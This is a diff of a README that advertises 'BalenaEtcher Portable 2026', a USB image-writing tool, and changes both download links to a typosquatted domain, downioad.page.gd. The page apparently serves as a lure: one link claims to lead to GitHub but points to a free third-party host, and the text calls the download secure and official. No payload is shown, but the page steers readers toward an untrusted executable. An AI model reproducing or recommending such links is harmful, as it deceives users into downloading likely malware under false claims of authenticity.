@@ -2,7 +2,7 @@
 
 BalenaEtcher Portable 2026 is a lightweight and powerful application designed to simplify the process of writing operating system images to USB drives and SD cards. It offers an intuitive interface and advanced options for users seeking a reliable tool on Windows 10 and 11 systems. Whether you're creating bootable media for installation or updates, this tool provides a seamless and efficient experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -59,7 +59,7 @@ Absolutely! BalenaEtcher Portable 2026 is compatible with various Linux ISOs, al
 
 To access the latest version of BalenaEtcher Portable 2026, please use the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This download is free, secure, and provides you with the most up-to-date features and improvements as of 2026. We recommend downloading only from official sources to ensure authenticity.
 
